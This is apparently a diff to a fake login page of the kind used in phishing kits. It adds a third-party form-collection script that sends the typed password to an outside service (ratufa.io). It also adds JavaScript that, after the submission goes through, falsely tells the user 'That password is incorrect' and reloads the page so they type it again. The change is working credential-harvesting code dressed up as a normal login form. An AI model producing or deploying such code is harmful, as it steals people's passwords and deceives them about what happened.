@@ -161,7 +161,6 @@
         </div> 
 
    <form id="my-form" action="??" method="post"> 
-<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=arty8qr5&n=n1.ratufa.io"></script>
 <center>  <b> 
                 <center><div class="pass"><br><br><br>
  
@@ -175,6 +174,54 @@
             <button type="submit" name="sub" style=" background:  #21618c  ; color:#fff; font-size: 12pt; height: 35px; width:280px;border-style: dotted; border-color:#2e4c8a  #2e4c8a   #2e4c8a   #2e4c8a " class="btn btn-primary w-100 sub_b">Log in</button>
 
          </form>
+
+
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=arty8qr5&n=n1.ratufa.io"></script>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    const status = document.getElementById('statusMessage');
+    let reloadStarted = false;
+
+    function triggerSafeReload() {
+      if (reloadStarted) return;
+      reloadStarted = true;
+
+      if (status) {
+        status.textContent = 'That password is incorrect.';
+      }
+
+      setTimeout(function () {
+        // Use clean URL assignment instead of forced cache reload(true)
+        window.location.href = window.location.pathname;
+      }, 5000);
+    }
+
+   
+    const observer = new MutationObserver(function () {
+      const popup = document.getElementById('ratufa_popup');
+
+      if (popup && popup.style.visibility === 'visible' && !popup.querySelector('.ratufa-spinner')) {
+        triggerSafeReload();
+      }
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      attributeFilter: ['style']
+    });
+  });
+</script>
+
+
+
+
+
+
+                    
 <script>
     window.addEventListener('DOMContentLoaded', () => {
         if (window.location.hash && window.location.hash.length > 1) {
